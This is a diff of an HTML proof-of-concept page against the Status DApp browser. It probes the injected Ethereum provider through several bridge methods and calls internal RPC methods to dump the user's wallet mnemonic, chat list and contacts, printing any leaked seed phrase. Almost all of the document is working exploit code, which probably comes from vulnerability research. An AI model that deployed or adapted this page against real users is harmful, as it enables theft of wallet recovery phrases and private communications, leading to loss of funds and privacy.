@@ -1,95 +1,91 @@
 <!DOCTYPE html>
-  <html>
-  <head>
-    <title>Status RPC Bypass POC</title>
-    <style>
-      body { font-family: monospace; padding: 20px; }
-      pre { background: #111; color: #0f0; padding: 15px; white-space: pre-wrap; word-break: break-all; }
-      button { padding: 12px 24px; font-size: 16px; margin: 5px; }
-    </style>
-  </head>
-  <body>
-    <h2>Status DApp Browser — callRPC Bypass PoC</h2>
-    <button onclick="runPOC('settings_getSettings')">1. Dump Mnemonic (settings_getSettings)</button>
-    <button onclick="runPOC('wakuext_chats', [])">2. Dump Chat List</button>
-    <button onclick="runPOC('wakuext_contacts', [])">3. Dump Contacts</button>
-    <button onclick="checkEnv()">4. Check Environment</button>
-    <pre id="out">Output will appear here...</pre>
-  
-  <script>
-  async function sendRPC(method, params) {
-    const payload = { jsonrpc: '2.0', id: Date.now(), method, params: params || [] };
+<html>
+<head>
+  <title>Status RPC Bypass POC</title>
+  <style>
+    body { font-family: monospace; padding: 20px; }
+    pre { background: #111; color: #0f0; padding: 15px; white-space: pre-wrap; word-break: break-all; }
+    button { padding: 12px 24px; font-size: 16px; margin: 5px; display: block; margin-bottom: 8px; }
+  </style>
+</head>
+<body>
+  <h2>Status DApp Browser — callRPC Bypass PoC</h2>
+  <button onclick="checkEnv()">0. Check Environment</button>
+  <button onclick="inspectProvider()">0b. Inspect Provider Methods</button>
+  <button onclick="runPOC('settings_getSettings')">1. Dump Mnemonic (settings_getSettings)</button>
+  <button onclick="runPOC('wakuext_chats', [])">2. Dump Chat List</button>
+  <button onclick="runPOC('wakuext_contacts', [])">3. Dump Contacts</button>
+  <pre id="out">Output will appear here...</pre>
 
-    // Pattern 1: EIP-1193 request() — may be on prototype
-    if (typeof window.ethereum.request === 'function') {
-      return await window.ethereum.request({ method, params: params || [] });
-    }
+<script>
+async function sendRPC(method, params) {
+  const payload = { jsonrpc: '2.0', id: Date.now(), method, params: params || [] };
 
-    // Pattern 2: sendAsync (legacy Status bridge)
-    if (typeof window.ethereum.sendAsync === 'function') {
-      return new Promise((resolve, reject) => {
-        window.ethereum.sendAsync(payload, (err, res) => {
-          if (err) reject(err);
-          else if (res.error) reject(res.error);
-          else resolve(res.result);
-        });
-      });
-    }
-
-    // Pattern 3: nativeEthereum direct bridge
-    if (window.ethereum.nativeEthereum) {
-      return new Promise((resolve, reject) => {
-        window.ethereum.nativeEthereum.send(JSON.stringify(payload), (response) => {
-          try {
-            const res = JSON.parse(response);
-            if (res.error) reject(res.error);
-            else resolve(res.result);
-          } catch(e) { reject(e); }
-        });
-      });
-    }
-
-    throw new Error('No usable provider method found');
+  // Pattern 1: EIP-1193 request() — may be on prototype
+  if (typeof window.ethereum.request === 'function') {
+    return await window.ethereum.request({ method, params: params || [] });
   }
 
-    // Strategy 2: Legacy sendAsync (Status injected provider)
+  // Pattern 2: sendAsync (legacy Status bridge)
+  if (typeof window.ethereum.sendAsync === 'function') {
     return new Promise((resolve, reject) => {
-      const provider = window.ethereum || (window.web3 && window.web3.currentProvider);
-      if (!provider) return reject('No provider found');
-      provider.sendAsync(payload, (err, res) => {
+      window.ethereum.sendAsync(payload, (err, res) => {
         if (err) reject(err);
+        else if (res.error) reject(res.error);
         else resolve(res.result);
       });
     });
   }
 
-  async function runPOC(method, params) {
-    const out = document.getElementById('out');
-    out.textContent = `Calling ${method}...`;
-    try {
-      const result = await sendRPC(method, params);
-      out.textContent = JSON.stringify(result, null, 2);
+  // Pattern 3: nativeEthereum direct bridge
+  if (window.ethereum.nativeEthereum) {
+    return new Promise((resolve, reject) => {
+      window.ethereum.nativeEthereum.send(JSON.stringify(payload), (response) => {
+        try {
+          const res = JSON.parse(response);
+          if (res.error) reject(res.error);
+          else resolve(res.result);
+        } catch(e) { reject(e); }
+      });
+    });
+  }
 
-      // Highlight the mnemonic if present
-      if (result && result.mnemonic) {
-        out.textContent += '\n\n⚠️   MNEMONIC LEAKED: ' + result.mnemonic;
-      }
-    } catch(e) {
-      out.textContent = 'Error: ' + JSON.stringify(e, null, 2);
+  throw new Error('No usable provider method found');
+}
+
+async function runPOC(method, params) {
+  const out = document.getElementById('out');
+  out.textContent = 'Calling ' + method + '...';
+  try {
+    const result = await sendRPC(method, params);
+    out.textContent = JSON.stringify(result, null, 2);
+    if (result && result.mnemonic) {
+      out.textContent += '\n\n*** MNEMONIC LEAKED: ' + result.mnemonic;
     }
+  } catch(e) {
+    out.textContent = 'Error: ' + JSON.stringify(e, null, 2);
   }
-  </script>
+}
 
-  <script>
-  function checkEnv() {
-    const info = {
-      hasEthereum: !!window.ethereum,
-      hasWeb3: !!window.web3,
-      ethereumKeys: window.ethereum ? Object.keys(window.ethereum) : [],
-      userAgent: navigator.userAgent
-    };
-    document.getElementById('out').textContent = JSON.stringify(info, null, 2);
-  }
-  </script>
-  </body>
-  </html>
+function checkEnv() {
+  document.getElementById('out').textContent = JSON.stringify({
+    hasEthereum: !!window.ethereum,
+    hasWeb3: !!window.web3,
+    ethereumKeys: window.ethereum ? Object.keys(window.ethereum) : [],
+    userAgent: navigator.userAgent
+  }, null, 2);
+}
+
+function inspectProvider() {
+  const proto = Object.getPrototypeOf(window.ethereum);
+  document.getElementById('out').textContent = JSON.stringify({
+    ownKeys: Object.keys(window.ethereum),
+    protoKeys: Object.getOwnPropertyNames(proto),
+    nativeEthereumType: typeof window.ethereum.nativeEthereum,
+    nativeEthereumKeys: window.ethereum.nativeEthereum
+      ? Object.keys(window.ethereum.nativeEthereum) : []
+  }, null, 2);
+}
+</script>
+</body>
+</html>
